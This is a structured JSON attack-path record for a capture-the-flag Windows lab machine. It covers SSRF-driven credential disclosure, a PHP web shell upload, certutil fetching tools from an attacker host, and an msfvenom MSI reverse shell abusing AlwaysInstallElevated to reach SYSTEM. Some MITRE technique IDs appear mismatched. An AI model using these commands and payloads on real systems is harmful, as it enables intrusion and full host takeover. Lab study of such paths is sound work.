{
  "id": "ap-0007",
  "title": "Windows Machine: SSRF to Credential Disclosure and RCE via File Upload",
  "summary": "Gaining administrator credentials through Server-Side Request Forgery (SSRF) against an internal web service, exploiting a vulnerable file upload for Remote Code Execution (RCE), and escalating privileges via the AlwaysInstallElevated misconfiguration.",
  "attack_path_markdown": "### Step 1\nInitial enumeration and port scanning reveals several services, including HTTP (80) and HTTPS (443) running a 'Voting System' application.\n### Step 2\nVirtual host enumeration is performed, revealing a secondary domain 'staging.love.htb'.\n### Step 3\nThe secondary web application is found to be vulnerable to SSRF via its file scanning feature, which is leveraged to access the internally hosted port 5000, revealing administrator credentials.\n### Step 4\nAuthentication to the 'Voting System' admin panel using the disclosed credentials is achieved.\n### Step 5\nA vulnerability in the authenticated file upload functionality (or an SQL injection bypass) is exploited to upload a PHP web shell.\n### Step 6\nRemote Code Execution (RCE) is confirmed via the webshell, and the user flag is retrieved.\n### Step 7\nPrivilege escalation is performed by transferring and executing an enumeration tool (WinPEAS).\n### Step 8\nThe AlwaysInstallElevated registry misconfiguration is identified and abused using a malicious MSI payload generated by msfvenom to gain NT Authority\\System access.",
  "kill_chain": [
    {
      "phase_order": 1,
      "phase_name": "Reconnaissance",
      "description": "Determine host status, OS type, open ports, and conduct initial web enumeration.",
      "actions": [
        "Check host availability and estimate OS based on TTL",
        "Scan all TCP ports for open services",
        "Enumerate web services and content"
      ],
      "tools": ["ping", "nmap", "WhichSystem.py", "whatweb", "nmap script http-enum"],
      "techniques": ["Active Scanning", "OS Fingerprinting", "Network Service Scanning"],
      "commands": [
        "ping -c 1 10.10.10.239",
        "python3 WhichSystem.py 10.10.10.239",
        "nmap -p- -sS -vvv -n --min-rate 5000 -Pn -oG all_ports 10.10.10.239",
        "nmap -p 80,443,135,139,445,3306,5000 -sCV -oN target.nmap 10.10.10.239",
        "whatweb 10.10.10.239",
        "nmap -p 80 --script http-enum -oN web_scan 10.10.10.239"
      ],
      "mitre_ids": ["T1046", "T1592"],
      "indicators": ["TTL 127/128 (Windows)", "Open ports: 80, 443, 135, 139, 445"],
      "preconditions": "Network connectivity to the target 10.10.10.239.",
      "expected_outcome": "List of open ports and target OS (Windows)."
    },
    {
      "phase_order": 2,
      "phase_name": "Weaponization",
      "description": "Preparation of domain resolution for virtual hosting and initial exploration of known vulnerabilities for the identified 'Voting System' application.",
      "actions": [
        "Add discovered domain names to /etc/hosts for name resolution",
        "Search for public vulnerabilities related to the 'Voting System'"
      ],
      "tools": ["text editor (for /etc/hosts)", "Searchsploit"],
      "techniques": ["OS Configuration", "Vulnerability Research"],
      "commands": [
        "echo '10.10.10.239 staging.love.htb love.htb' >> /etc/hosts",
        "searchsploit 'voting system 1.0'"
      ],
      "mitre_ids": ["T1592", "T1589"],
      "indicators": ["Domain names staging.love.htb and love.htb", "Searchsploit results mentioning SQL injection and RCE for 'Voting System 1.0'"],
      "preconditions": "Discovery of domain names in the SSL certificate and existence of web application.",
      "expected_outcome": "Local DNS resolution for virtual hosts and potential exploits identified."
    },
    {
      "phase_order": 3,
      "phase_name": "Delivery",
      "description": "Exploit the 'Free File Scanner' application via Server-Side Request Forgery (SSRF) to access restricted internal resources and disclose critical credentials.",
      "actions": [
        "Test file scanner feature for LFI/SSRF",
        "Leverage SSRF to access localhost resources",
        "Obtain administrator credentials from internal service on port 5000"
      ],
      "tools": ["Browser", "Web shell feature"],
      "techniques": ["Server-Side Request Forgery (SSRF) [1, 2]", "Credential Access (T1535)"],
      "commands": [
        "SSRF Payload URL: http://127.0.0.1:5000 (Submitted to the scanner feature) [2]"
      ],
      "mitre_ids": ["T1190", "T1595"],
      "indicators": ["Access to internal web service on port 5000", "Disclosed password: loveisinthere"],
      "preconditions": "Access to the 'Free File Scanner' on staging.love.htb.",
      "expected_outcome": "Administrator credentials obtained: admin:loveisinthere."
    }
,
    {
      "phase_order": 4,
      "phase_name": "Exploitation",
      "description": "Gain initial access by authenticating as administrator and exploiting the authenticated vulnerability to upload a web shell for Remote Code Execution.",
      "actions": [
        "Authenticate to the voting system admin panel",
        "Upload PHP webshell (cmd.php) to the server using the vulnerable admin feature"
      ],
      "tools": ["Browser", "PHP shell script"],
      "techniques": ["Valid Accounts (T1078)", "Exploitation for Credential Access (T1212)", "Remote Code Execution (RCE) via file upload (T1505.004)"],
      "commands": [
        "Authenticate with admin:loveisinthere",
        "PHP Web Shell Content: <?php echo system($_GET['cmd']); ?> [3, 4]"
      ],
      "mitre_ids": ["T1078", "T1505.004"],
      "indicators": ["Successful file upload to /images/cmd.php", "RCE achieved through cmd parameter"],
      "preconditions": "Administrator credentials obtained and access to the admin file upload page.",
      "expected_outcome": "Initial low-privileged shell access (RCE)."
    },
    {
      "phase_order": 5,
      "phase_name": "Installation",
      "description": "Establish persistent command execution capability and retrieve the user flag.",
      "actions": [
        "Verify command execution via the webshell",
        "Locate and retrieve the user.txt flag"
      ],
      "tools": ["Webshell access (Browser)"],
      "techniques": ["Web Shell (T1505.003)", "System Information Discovery (T1082)"],
      "commands": [
        "http://10.10.10.239/images/cmd.php?cmd=whoami",
        "http://10.10.10.239/images/cmd.php?cmd=ipconfig",
        "http://10.10.10.239/images/cmd.php?cmd=type C:\\Users\\neo\\Desktop\\user.txt"
      ],
      "mitre_ids": ["T1505.003", "T1082"],
      "indicators": ["Successful command output (e.g., 'love\\neo') [5]", "user.txt flag retrieved."],
      "preconditions": "Working web shell access established in the previous phase.",
      "expected_outcome": "User-level access confirmed."
    },
    {
      "phase_order": 6,
      "phase_name": "Command and Control",
      "description": "Prepare the environment for privilege escalation by transferring enumeration and exploitation tools.",
      "actions": [
        "Create temporary directory for tools",
        "Transfer Windows enumeration tool (WinPEASx64.exe) to the target using certutil"
      ],
      "tools": ["Webshell", "certutil", "python SimpleHTTPServer"],
      "techniques": ["Remote File Copy (T1105)"],
      "commands": [
        "http://10.10.10.239/images/cmd.php?cmd=mkdir C:\\Windows\\Temp\\privesc",
        "http://10.10.10.239/images/cmd.php?cmd=certutil -urlcache -f http://[ATTACKER_IP]/WinPEASx64.exe C:\\Windows\\Temp\\privesc\\WinPEAS.exe"
      ],
      "mitre_ids": ["T1105"],
      "indicators": ["Tool successfully transferred to the target's temporary directory."],
      "preconditions": "Ability to execute file transfers using system binaries (certutil).",
      "expected_outcome": "Privilege escalation tools staged on the victim system."
    },
    {
      "phase_order": 7,
      "phase_name": "Actions on Objectives",
      "description": "Execute privilege escalation technique to gain SYSTEM authority and retrieve the final root flag.",
      "actions": [
        "Execute WinPEAS for vulnerability enumeration",
        "Identify AlwaysInstallElevated misconfiguration",
        "Generate MSI payload for SYSTEM reverse shell",
        "Set up local listener",
        "Execute the MSI installer via msiexec to gain SYSTEM shell"
      ],
      "tools": ["WinPEASx64.exe", "msfvenom", "Netcat (nc)"],
      "techniques": ["AlwaysInstallElevated Abuse (T1548.002) [6]", "Exploitation for Privilege Escalation (T1068)"],
      "commands": [
        "C:\\Windows\\Temp\\privesc\\WinPEAS.exe (Execution for enumeration) [7]",
        "msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ATTACKER_IP] LPORT=443 -f msi -o reverse.msi [8, 9]",
        "nc -lvnp 443",
        "msiexec /quiet /i reverse.msi /qn /norestart [10]"
      ],
      "mitre_ids": ["T1548.002", "T1068"],
      "indicators": ["WinPEAS output confirming AlwaysInstallElevated=1 [6]", "Reverse shell connection received as 'nt authority\\system' [10]"],
      "preconditions": "Low-privileged access and identification of AlwaysInstallElevated.",
      "expected_outcome": "SYSTEM access obtained and root flag retrieved."
    }
  ],
  "tactics": ["Reconnaissance", "Initial Access", "Credential Access", "Privilege Escalation", "Execution"],
  "techniques": ["Server-Side Request Forgery", "SQL Injection", "Remote Code Execution", "AlwaysInstallElevated Abuse"],
  "mitre_ids": ["T1190", "T1505.004", "T1548.002", "T1046"],
  "hosts": ["10.10.10.239"],
  "privs_obtained": ["user", "NT Authority\\System"],
  "confidence": 0.9,
  "source_file": "",
  "notes": "Procedure used an authenticated RCE method following credential disclosure via SSRF. Privilege escalation relied on a common Windows misconfiguration.",
  "labels": ["windows", "web", "ssrf", "msiexec", "privesc"]
}

